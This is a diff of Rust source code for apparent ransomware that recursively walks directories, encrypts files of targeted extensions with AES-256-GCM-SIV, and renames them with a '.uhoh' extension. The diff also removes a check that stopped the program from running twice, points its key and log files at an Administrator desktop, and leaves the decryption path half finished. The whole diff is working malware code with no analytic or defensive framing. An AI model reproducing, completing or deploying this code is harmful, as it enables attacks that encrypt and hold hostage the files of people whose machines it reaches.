@@ -14,7 +14,7 @@ use rand_chacha::rand_core::{RngCore, SeedableRng};
 use rand_chacha::ChaCha20Rng;
 use std::f32::consts::E;
 use std::ffi::OsStr;
-use std::fmt;
+use std::{fmt, fs};
 use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::PathBuf;
@@ -49,13 +49,6 @@ fn main() -> Result<(), std::io::Error> {
         }
     }
 
-    if check_already_run() {
-        println!("Already run");
-        return Ok(());
-    } else {
-        println!("Not already run");
-    }
-
     let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
@@ -66,18 +59,13 @@ fn main() -> Result<(), std::io::Error> {
                                          // let test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
                                          // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
     println!("Cipher key before user input: {:?}", hex::encode(&key));
-    let _ = traverse(false, &mut cipher);
+    let _ = traverse(false, &mut cipher);//decrypt
     //write hex::
-    let mut keyfile = File::create("C:\\Users\\win11\\Desktop\\key.txt")?;
+    let mut keyfile = File::create("C:\\Users\\Administrator\\Desktop\\key.txt")?;
     keyfile.write_all(&hex::encode(&key).as_bytes())?;
     writeln!(keyfile, "\n\n\nhello")?;
     drop(keyfile);
     Ok(())
-}
-
-fn check_already_run() -> bool {
-    //if key.txt exists, then the program has already run. return true
-    Path::new("C:\\Users\\win11\\Desktop\\key.txt").exists()
 }
 
 /**
@@ -91,7 +79,7 @@ fn check_already_run() -> bool {
 fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
     //return result
     //search recursively through all directories and find files
-    let test_file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
+    let test_file = File::create("C:\\Users\\Administrator\\Desktop\\output.txt");
 
     if !do_encrypt {
         loop {
@@ -133,33 +121,38 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
                     if entry.file_type().is_file()
                         && valid_extensions.contains(&extension.to_str().unwrap_or(""))
                     {
-                        // writeln!(
-                        //     //this is just debug code
-                        //     test_file.as_ref().unwrap(),
-                        //     "found file: {}",
-                        //     entry.path().display()
-                        // );
-                        //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
-                        //FIXME: herererer
+                        let mut a_file = entry.path();
                         if do_encrypt {
-                            let _ = encrypt(entry.path(), &cipher);
+                            let _ = encrypt(a_file, &cipher);
 
-                            // encrypt(entry.path(), cipher);
+                            // change file extension after doing all that
+                            let borked_file = format!("{}.uhoh", a_file.to_string_lossy());
+                            fs::rename(a_file, borked_file);
+                            //TODO: error test this
+                            
                         } else {
-                            match decrypt(entry.path(), &cipher) {
+                            
+                            // println!("encrypted file extension: {:?}", a_file.extension());
+                            //TODO: get rid of the extension before decryption
+                            // let mut old_filename = Path::new(a_file).file_stem().unwrap();
+                            // fs::rename(a_file, old_filename);
+
+                            match decrypt(a_file, &cipher) {
                                 Ok(_) => {
-                                    let _ = writeln!(
-                                        test_file.as_ref().unwrap(),
-                                        "Decrypted file: {}",
-                                        entry.path().display()
-                                    );
+                                    // let _ = writeln!(
+                                    //     a_file.as_ref().unwrap(),
+                                    //     "Decrypted file: {}",
+                                    //     entry.path().display()
+                                    // );
+
+                                    //TODO: later: 
                                 }
                                 Err(e) => {
-                                    let _ = writeln!(
-                                        test_file.as_ref().unwrap(),
-                                        "Error decrypting file: {}",
-                                        e
-                                    );
+                                    // let _ = writeln!(
+                                    //     uhoh_file,
+                                    //     "Error decrypting file: {}",
+                                    //     e
+                                    // );
                                     continue;
                                 }
                             }
